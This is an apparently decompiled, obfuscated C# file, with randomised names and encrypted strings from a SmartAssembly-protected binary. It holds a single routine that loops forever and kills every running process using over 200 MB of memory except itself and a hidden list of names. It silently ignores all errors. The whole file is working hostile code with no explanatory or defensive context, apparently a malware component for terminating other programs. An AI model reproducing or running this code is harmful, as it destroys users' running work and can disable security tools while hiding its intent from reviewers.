using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bpbWYHKNCNX;

public static class NTDMoZZtMG
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void OZNelJrYAdqI()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107403140)) && !process.ProcessName.Contains(getString_0(107403163)) && !process.ProcessName.Contains(getString_0(107403154)) && !process.ProcessName.Contains(getString_0(107403113)) && !process.ProcessName.Contains(getString_0(107403132)) && !process.ProcessName.Contains(getString_0(107403087)) && !process.ProcessName.Contains(getString_0(107403074)) && !process.ProcessName.Contains(getString_0(107403093)) && !process.ProcessName.Contains(getString_0(107403048)) && !process.ProcessName.Contains(getString_0(107403067)) && !process.ProcessName.Contains(getString_0(107403014)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static NTDMoZZtMG()
	{
		Strings.CreateGetStringDelegate(typeof(NTDMoZZtMG));
	}
}
